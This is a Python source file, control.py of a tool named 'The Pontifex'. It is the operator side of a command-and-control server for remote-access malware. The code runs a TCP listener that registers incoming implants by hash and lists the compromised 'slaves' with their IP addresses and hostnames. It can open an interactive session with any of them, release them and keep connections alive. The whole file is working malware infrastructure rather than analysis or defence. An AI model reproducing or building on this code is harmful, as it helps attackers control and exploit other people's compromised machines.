# -*- coding: utf-8 -*-

###############################################################
##   control.py                                              ##
##   The Pontifex                                            ##
##   Created by Kryptosr on 2020-11-03.                      ##
##   Copyright © 2020 Kryptosr. All rights reserved.         ##
###############################################################

import sys, os, threading, time, socket
from rich.table import Table
from lib.Protocol.PacketType import PacketType
from lib.helper import *
from lib.debug import Debug, log, console
from lib.server import TCPServer
from lib.dmos import Dmos


class Control():
    def __init__(self, ANODE, APORT):
        self.ANODE = ANODE
        self.APORT = APORT
        self.dmoss = {}
        self.server = TCPServer(self.ANODE, self.APORT, self)
        self.isConnected = False
        self.active = False
        self.listener = None

    def cmdline(self):
        #cmdList = ["exit", "clear", "list", "i", "r"]
        #readline.Readline().set_completer(TabCompleter(cmdList).complete)
        while 1:
            try:
                cmd = Debug.prompt_input("[Pontifex] → ")
                command = cmd.split(' ')[0]
                args = cmd[len(command)+1:]
            
                if command == "exit":
                    self.terminate_server()
                elif command == "clear":
                    os.system(CMD_CLEAR)
                elif command == "free":
                    self.dmoss[args].free_dmos({'commandID': "free"})
                    self.server.terminate_dmos(self.dmoss, self.dmoss[args], "gracefully")
                elif command == "list":
                    if not self.dmoss:
                        Debug.eprint("There are no slaves online")
                    else:
                        table = Table(show_header=True, header_style="bold magenta")
                        
                        table.add_column("BORN", style="dim", width=19)
                        table.add_column("HASH", width=32)
                        table.add_column("GLOBAL IP")
                        table.add_column("HOSTNAME", justify="right")

                        for _, hash in enumerate(self.dmoss):
                            table.add_row(self.dmoss[hash].born, hash, self.dmoss[hash].GLOBAL, self.dmoss[hash].HOSTNAME)
                        console.print(table)
                elif command == "i":
                    try:
                        self.dmoss[args].interact()
                    except KeyError:
                        log.error("Invalid MD5_hash")
                elif command == "r":
                    self.server.s.close()
                    python = sys.executable
                    os.execl(python, python, *sys.argv)
            except ConnectionBroken:
                log.error("Command was interrupted by abrupt broken connection")
                continue

    def disconnect_all(self):
        for dmos in self.dmoss:
            self.dmoss[dmos].free_dmos({'commandID': "free"})

    def terminate_server(self):
        Debug.sprint("C2 is shutting down..", ANODE=self.ANODE, APORT=self.APORT)
        self.disconnect_all()
        self.active = False
        if self.listener:
            # TODO: fix windows error
            try:
                socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((self.server.ANODE,self.server.APORT))
                self.listener.join()
            except:
                pass
        time.sleep(0.5)
        os._exit(1)

    def listener_daemon(self):
            while 1:
                if self.active:
                    dmos = self.server.accept_conn()
                    if dmos != None:
                        for d in self.dmoss.keys():
                            if d == dmos.md5_hash:
                                self.isConnected = True
                                dmos.free_dmos({'commandID': "free"})
                        if self.isConnected != True:
                            Debug.sprint(f"Connection from {dmos.md5_hash} ({dmos.GLOBAL})", ANODE=self.ANODE, APORT=self.APORT, thread=True)
                            #dmos.multi_handler = self
                            self.dmoss[dmos.md5_hash] = dmos
                    else:
                        pass
                else:
                    return


    @safe_exec
    def start_listener_daemon(self):
        self.listener = threading.Thread(target=self.listener_daemon)
        #LISTENER.daemon = True
        try:
            self.active = True
            self.listener.start()
            Debug.sprint("TCP server is online", ANODE=self.ANODE, APORT=self.APORT)
        except Exception as e:
            Debug.eprint(f"Unable to start daemon listener, Error: {e}")

    @safe_exec
    def start_c2(self):
        self.server.listener()

    @safe_exec
    def start_keepAlive(self):
        KEEPALIVE = threading.Thread(target=self.server.keepAlive)
        KEEPALIVE.start()

    def start_multi_handler(self):
        os.system(CMD_CLEAR)
        banner()
        self.start_c2()
        self.start_listener_daemon()
        self.start_keepAlive()
        self.cmdline()

